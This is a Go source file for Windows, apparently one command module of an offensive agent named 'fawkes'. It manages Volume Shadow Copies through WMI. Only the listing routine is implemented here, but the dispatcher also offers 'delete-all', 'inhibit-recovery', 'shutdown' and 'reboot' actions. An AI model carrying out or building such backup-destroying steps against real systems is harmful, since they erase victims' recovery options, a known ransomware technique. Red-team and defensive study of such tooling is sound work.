//go:build windows
// +build windows

package commands

import (
	"fmt"
	"runtime"
	"strings"

	ole "github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"

	"fawkes/pkg/structs"
)

type VSSCommand struct{}

func (c *VSSCommand) Name() string {
	return "vss"
}

func (c *VSSCommand) Description() string {
	return "Manage Volume Shadow Copies — list, create, delete, and extract files"
}

func (c *VSSCommand) Execute(task structs.Task) structs.CommandResult {
	args, parseErr := unmarshalParams[vssArgs](task)
	if parseErr != nil {
		return *parseErr
	}

	switch strings.ToLower(args.Action) {
	case "list":
		return vssList()
	case "create":
		return vssCreate(args)
	case "delete":
		return vssDelete(args)
	case "extract":
		return vssExtract(args)
	case "delete-all":
		return vssDeleteAll(args)
	case "inhibit-recovery":
		return vssInhibitRecovery(args)
	case "shutdown":
		return vssShutdownWindows(args)
	case "reboot":
		return vssRebootWindows(args)
	default:
		return errorf("Unknown action: %s\nAvailable: list, create, delete, delete-all, extract, inhibit-recovery, shutdown, reboot", args.Action)
	}
}

// vssWMIConnect connects to root\CIMV2 for VSS operations.
func vssWMIConnect() (*ole.IDispatch, *ole.IDispatch, func(), error) {
	runtime.LockOSThread()

	err := ole.CoInitializeEx(0, ole.COINIT_MULTITHREADED)
	if err != nil {
		oleErr, ok := err.(*ole.OleError)
		if !ok || (oleErr.Code() != ole.S_OK && oleErr.Code() != 0x00000001) {
			runtime.UnlockOSThread()
			return nil, nil, nil, fmt.Errorf("CoInitializeEx failed: %v", err)
		}
	}

	unknown, err := oleutil.CreateObject("WbemScripting.SWbemLocator")
	if err != nil {
		ole.CoUninitialize()
		runtime.UnlockOSThread()
		return nil, nil, nil, fmt.Errorf("failed to create SWbemLocator: %v", err)
	}
	locator, err := unknown.QueryInterface(ole.IID_IDispatch)
	unknown.Release()
	if err != nil {
		ole.CoUninitialize()
		runtime.UnlockOSThread()
		return nil, nil, nil, fmt.Errorf("failed to query IDispatch: %v", err)
	}

	serviceResult, err := oleutil.CallMethod(locator, "ConnectServer", "", `root\CIMV2`)
	if err != nil {
		locator.Release()
		ole.CoUninitialize()
		runtime.UnlockOSThread()
		return nil, nil, nil, fmt.Errorf("ConnectServer failed: %v", err)
	}
	services := serviceResult.ToIDispatch()

	cleanup := func() {
		services.Release()
		locator.Release()
		ole.CoUninitialize()
		runtime.UnlockOSThread()
	}

	return locator, services, cleanup, nil
}

// vssList enumerates all shadow copies.
func vssList() structs.CommandResult {
	_, services, cleanup, err := vssWMIConnect()
	if err != nil {
		return errorf("Error connecting to WMI: %v", err)
	}
	defer cleanup()

	resultSet, err := oleutil.CallMethod(services, "ExecQuery",
		"SELECT ID, DeviceObject, VolumeName, InstallDate, OriginatingMachine, ServiceMachine FROM Win32_ShadowCopy")
	if err != nil {
		return errorf("Error querying shadow copies: %v", err)
	}
	defer resultSet.Clear()

	resultDisp := resultSet.ToIDispatch()
	var sb strings.Builder
	sb.WriteString("Volume Shadow Copies:\n\n")

	count := 0
	err = oleutil.ForEach(resultDisp, func(v *ole.VARIANT) error {
		item := v.ToIDispatch()
		// Note: do NOT Release item — ForEach manages the VARIANT lifecycle

		idResult, _ := oleutil.GetProperty(item, "ID")
		devResult, _ := oleutil.GetProperty(item, "DeviceObject")
		volResult, _ := oleutil.GetProperty(item, "VolumeName")
		dateResult, _ := oleutil.GetProperty(item, "InstallDate")
		origResult, _ := oleutil.GetProperty(item, "OriginatingMachine")

		id := ""
		if idResult != nil {
			id = idResult.ToString()
			idResult.Clear()
		}
		dev := ""
		if devResult != nil {
			dev = devResult.ToString()
			devResult.Clear()
		}
		vol := ""
		if volResult != nil {
			vol = volResult.ToString()
			volResult.Clear()
		}
		date := ""
		if dateResult != nil {
			date = dateResult.ToString()
			dateResult.Clear()
		}
		orig := ""
		if origResult != nil {
			orig = origResult.ToString()
			origResult.Clear()
		}

		if count > 0 {
			sb.WriteString("\n")
		}
		count++
		sb.WriteString(fmt.Sprintf("  [%d] ID: %s\n", count, id))
		sb.WriteString(fmt.Sprintf("      Device: %s\n", dev))
		sb.WriteString(fmt.Sprintf("      Volume: %s\n", vol))
		sb.WriteString(fmt.Sprintf("      Created: %s\n", date))
		sb.WriteString(fmt.Sprintf("      Machine: %s\n", orig))
		return nil
	})

	if err != nil {
		return errorf("Error enumerating shadow copies: %v\n%s", err, sb.String())
	}

	if count == 0 {
		sb.WriteString("  (none found)\n")
	}
	sb.WriteString(fmt.Sprintf("\nTotal: %d shadow copies\n", count))

	return successResult(sb.String())
}

// vssCreate, vssDelete, vssExtract, vssDeleteAll, vssInhibitRecovery
// are in vss_operations.go.

